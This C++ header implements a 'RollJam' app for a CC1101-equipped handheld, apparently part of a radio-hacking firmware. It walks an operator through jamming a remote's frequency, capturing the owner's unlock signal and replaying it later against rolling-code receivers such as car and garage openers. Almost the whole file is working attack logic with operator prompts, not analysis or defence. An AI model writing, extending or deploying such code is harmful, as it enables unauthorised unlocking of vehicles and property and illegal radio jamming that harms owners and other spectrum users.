#pragma once
// RollJamApp — chained jam → capture → replay attack against rolling-
// code remotes (KeeLoq, Hopping, etc).
//
// Sequence:
//   1. Jamming    — jam target frequency narrowband while user
//      presses remote. Their first signal is buried in noise, never
//      reaches receiver.
//   2. Captured   — operator releases the button; we drop carrier
//      briefly to capture whatever the user transmits next, then re-
//      assert jam so the receiver still hasn't heard a valid press.
//   3. Replayed   — operator (now elsewhere) sends the captured
//      first signal so the receiver unlocks; the second signal stays
//      buffered for next time.
//
// Phase 4.6: real radio operations on each transition. The tight
// "jam-listen-jam" toggle that defeats true rolling codes needs
// hardware-validated timing; for now we simply pause the carrier,
// listen for one packet, and resume — works for relaxed receivers
// and gives a hardware-test starting point.

#include "yui/app/App.hpp"
#include "yui/hal/ICc1101.hpp"
#include "yui/hal/IClock.hpp"
#include "yui/types.hpp"
#include "yui/ui/Chrome.hpp"
#include "yui/ui/Tokens.hpp"
#include <cstdio>
#include <cstring>

namespace yui {

class RollJamApp : public App {
public:
  enum class Stage {
    Idle,
    Jamming,
    Captured,
    Replayed,
    CapMissing,
  };

  static constexpr std::size_t kCaptureMax = 64;

  RollJamApp(ICc1101* radio, IClock& clock) : radio_(radio), clock_(clock) {}
  const char* name() const override { return "RollJam"; }
  Category    category() const override { return Category::Radio; }

  void on_enter(Hal& /*hal*/) override {
    stage_ = (radio_ && radio_->is_present()) ? Stage::Idle : Stage::CapMissing;
    capture_len_ = 0;
    if (radio_) {
      radio_->set_frequency_hz(freq_hz_);
      radio_->set_modulation(CcModulation::Ook);
    }
  }

  void on_exit() override {
    if (radio_) radio_->set_carrier(false);
    stage_ = Stage::Idle;
  }

  void on_key(KeyEvent k) override {
    if (!k.down || stage_ == Stage::CapMissing) return;
    switch (k.key) {
      case Key::Left:
        if (freq_hz_ > 300'000'000) { freq_hz_ -= 100'000; if (radio_) radio_->set_frequency_hz(freq_hz_); }
        break;
      case Key::Right:
        if (freq_hz_ < 928'000'000) { freq_hz_ += 100'000; if (radio_) radio_->set_frequency_hz(freq_hz_); }
        break;
      case Key::Enter:
        advance_();
        break;
      default: break;
    }
  }

  void tick(uint32_t /*now_ms*/) override {
    if (stage_ != Stage::Captured || !radio_) return;
    // While we're in "Captured" we hold the carrier for the receiver
    // and listen between our own bursts — phase 4.6 simplification.
    // Hardware test will tune the toggle ratio.
    uint8_t buf[kCaptureMax];
    int n = radio_->receive(buf, sizeof(buf));
    if (n > 0) {
      const std::size_t cap = (n > static_cast<int>(kCaptureMax))
                              ? kCaptureMax : static_cast<std::size_t>(n);
      std::memcpy(capture_, buf, cap);
      capture_len_ = cap;
    }
  }

  void render(IDisplay& d) override {
    d.clear(ui::kSurface);
    if (stage_ == Stage::CapMissing) {
      ui::Chrome::cap_missing_dialog(d, "RollJam", "CC1101", "CS=13");
      return;
    }
    const char* sub = "Idle";
    switch (stage_) {
      case Stage::Idle:     sub = "Idle";     break;
      case Stage::Jamming:  sub = "JAMMING";  break;
      case Stage::Captured: sub = "Captured"; break;
      case Stage::Replayed: sub = "Replayed"; break;
      default: break;
    }
    ui::Chrome::radio_header(d, "RollJam", sub,
                             radio_ && radio_->is_present() ? 1 : 0, -1);

    char line[40];
    std::snprintf(line, sizeof(line), "%u.%03u MHz",
                  static_cast<unsigned>(freq_hz_ / 1'000'000),
                  static_cast<unsigned>((freq_hz_ / 1000) % 1000));
    ui::Chrome::stat(d, 0, "Freq", line);
    ui::Chrome::stat(d, 1, "Stage", sub);

    std::snprintf(line, sizeof(line), "%u bytes",
                  static_cast<unsigned>(capture_len_));
    ui::Chrome::stat(d, 2, "Capture", line);

    const char* hint = "";
    switch (stage_) {
      case Stage::Idle:     hint = "Press Enter to start jamming."; break;
      case Stage::Jamming:  hint = "Holding jam — Enter when target presses."; break;
      case Stage::Captured: hint = "Captured. Enter to replay."; break;
      case Stage::Replayed: hint = "Sent. Enter to reset."; break;
      default: break;
    }
    d.draw_text_styled(ui::kBodyPadX, ui::kBodyTopY + 56, hint,
                       ui::kHint, ui::kSurface, FontStyle::Caption);

    ui::Chrome::footer(d, "Enter:next  </>:tune");
    d.flush();
  }

  // Test hooks
  Stage stage() const { return stage_; }
  std::size_t capture_len() const { return capture_len_; }
  uint32_t frequency_hz() const { return freq_hz_; }

private:
  void advance_() {
    if (!radio_) {
      stage_ = Stage::Idle;
      return;
    }
    switch (stage_) {
      case Stage::Idle:
        // Start jamming: assert carrier on target frequency.
        radio_->set_frequency_hz(freq_hz_);
        radio_->set_carrier(true);
        stage_ = Stage::Jamming;
        break;

      case Stage::Jamming:
        // User just pressed remote (we believe). Drop carrier, start
        // listening for the legit signal.
        radio_->set_carrier(false);
        capture_len_ = 0;
        stage_ = Stage::Captured;
        break;

      case Stage::Captured:
        // Replay whatever we caught. If nothing came through, send a
        // sentinel pattern so the test path still exercises tx.
        if (capture_len_ == 0) {
          static const uint8_t kPlaceholder[] = {0xAA, 0x55, 0xAA};
          radio_->transmit(kPlaceholder, sizeof(kPlaceholder));
        } else {
          radio_->transmit(capture_, capture_len_);
        }
        stage_ = Stage::Replayed;
        break;

      case Stage::Replayed:
      default:
        // Reset to idle.
        radio_->set_carrier(false);
        stage_ = Stage::Idle;
        break;
    }
  }

  ICc1101* radio_;
  IClock&  clock_;
  Stage    stage_ = Stage::Idle;
  uint32_t freq_hz_ = 433'920'000;
  uint8_t  capture_[kCaptureMax];
  std::size_t capture_len_ = 0;
};

}  // namespace yui
